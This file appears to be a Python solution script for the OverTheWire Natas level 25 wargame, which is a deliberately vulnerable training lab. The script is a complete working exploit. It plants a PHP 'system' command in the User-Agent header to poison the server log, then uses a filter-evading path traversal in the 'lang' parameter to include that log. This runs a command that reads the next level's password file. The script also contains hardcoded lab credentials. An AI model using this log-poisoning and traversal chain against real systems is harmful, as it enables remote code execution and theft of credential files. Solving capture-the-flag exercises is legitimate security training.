#!/usr/bin/python
import requests

username = "natas25"
password = "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws"
url = f"http://{username}.natas.labs.overthewire.org/"

headers = {"User-Agent":"<?php system('cat /etc/natas_webpass/natas26');?>"}
session = requests.Session()

response2 = session.get(url,auth = (username,password))

response = session.post(url,headers=headers,data={ "lang" : "..././..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_"+session.cookies.get('PHPSESSID')+".log"}, auth = (username,password))
content = response.text

print(content)
